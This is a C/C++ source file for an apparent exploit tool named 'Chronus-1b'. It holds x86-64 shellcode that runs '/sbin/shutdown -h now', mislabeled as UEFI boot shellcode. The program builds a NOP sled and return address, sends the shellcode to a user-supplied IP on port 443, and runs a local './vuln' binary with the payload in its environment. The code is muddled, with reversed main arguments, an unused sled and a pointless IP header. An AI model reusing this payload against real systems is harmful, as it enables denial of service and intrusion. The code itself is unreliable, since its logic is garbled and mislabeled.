#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdio.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <cstring>
#include <cstdlib>

#include "resource/iphdr"
/*Define a Small buffer*/
#define VULN "./vuln`"
/* UEFI Boot Shellcode. */

#define PORT 443
#define SIZE 160

 char  sc[]=  "\x48\x31\xc0\x48\x31\xd2\x50\x6a"
"\x77\x66\x68\x6e\x6f\x48\x89\xe3"
"\x50\x66\x68\x2d\x68\x48\x89\xe1"
"\x50\x49\xb8\x2f\x73\x62\x69\x6e"
"\x2f\x2f\x2f\x49\xba\x73\x68\x75"
"\x74\x64\x6f\x77\x6e\x41\x52\x41"
"\x50\x48\x89\xe7\x52\x53\x51\x57"
"\x48\x89\xe6\x48\x83\xc0\x3b\x0f"
"\x05";
int sclen = sizeof(sc) -1;

int main(char * argv[], int  argc)  
{
    char p[SIZE];
    // our socket
    int ipv4 = socket(AF_INET, SOCK_STREAM, 0);
    
    if (ipv4 < 0) 
    {
        perror("socket");
        exit(EXIT_FAILURE);
    }
    // ENVP / Environment Variable Call : char * env  = {sc, NULL};
    char  *env[] = {sc, NULL};
    char  *vuln[] = {VULN, p, NULL };

    char nop_sled[SIZE];
    memset(nop_sled, 0x90, SIZE); // Fill the buffer with NOP instructions
    memcpy(nop_sled + SIZE - sizeof(sc) - 1, sc, sizeof(sc)); // Place the shellcode at the end of the NOP sled
    nop_sled[SIZE - 1] = '\0'; // Null-terminate the buffer
    
    // Declare a pointer, an index, and then a storage for the memory address of sc.
    int *ptr, i, addr;
    addr = 0xbffffffa - strlen(sc) - strlen(VULN);
    fprintf(stderr, "[***] using address: %#010x\n", addr); // Return shellcode address.

    // address structure
    char address[256];
    struct hostent* host;

    int set, conn; // bind and connect placeholders.

    // IP Header configuration.
    h_data token;
    iphdr* header;

    char buffer[8] = {IPPROTO_TCP};


    printf(" Chronus-1b \n");

    printf(" Designed by poet5. \n \n");

    printf(" Enter in Linux Build: \n");

    scanf("%255s", address);
    struct in_addr res; // resolve

    printf("Getting host. \n");

    if (inet_aton(address, &res) == 0 )
    {
        fprintf(stderr, "IP Invalid %s \n", address);
        exit(EXIT_FAILURE);
    }
    else 
    {
        printf(" Host found, initializing connection \n");
    }
    // *( struct in_addr*)host->h_addr_list

    sockaddr_in storage;
    storage.sin_addr.s_addr = INADDR_ANY;
    storage.sin_family = AF_INET;
    storage.sin_port = htons(PORT); // Port 0 is for dynamic port.
    printf("Storage resolved. \n");
    sockaddr_in remote;
    remote.sin_addr.s_addr = inet_addr(address);
    remote.sin_family = AF_INET;
    remote.sin_port = htons(PORT);
    printf("Binding \n");
    /*
    if (bind(ipv4, ( sockaddr*)&storage, sizeof(storage) ) < 0) 
    {
        perror("bind");
        exit(EXIT_FAILURE);
    }*/



    // After initial connection has been made, declare IP Header.
    header = (struct iphdr *)malloc(sizeof(struct iphdr));
    memset(header, 0, sizeof(iphdr));
    header->saddr = INADDR_ANY;
    header->daddr = inet_addr(address);
    header->ttl = 5; // 5 seconds live time.
    header->protocol = IPPROTO_TCP;

    token.HtonData(header, buffer);
    printf("Token Data Registered. \n");

    // Connect to remote host
    if (connect(ipv4, (struct sockaddr *)&remote, sizeof(remote)) < 0) {
        perror("connect");

    }
    printf("Connection, complete.");

    // Send the shellcode
    if (send(ipv4, sc, sizeof(sc), 0) < 0) {
        perror("send");
        exit(EXIT_FAILURE);
    }
    printf("Complete. \n");
    // Close the socket
    execle(vuln[0], (char*)vuln, p, NULL, env);
    printf("Executed vulnerability.");
    close(ipv4);
    free(header);
    return 0;
}
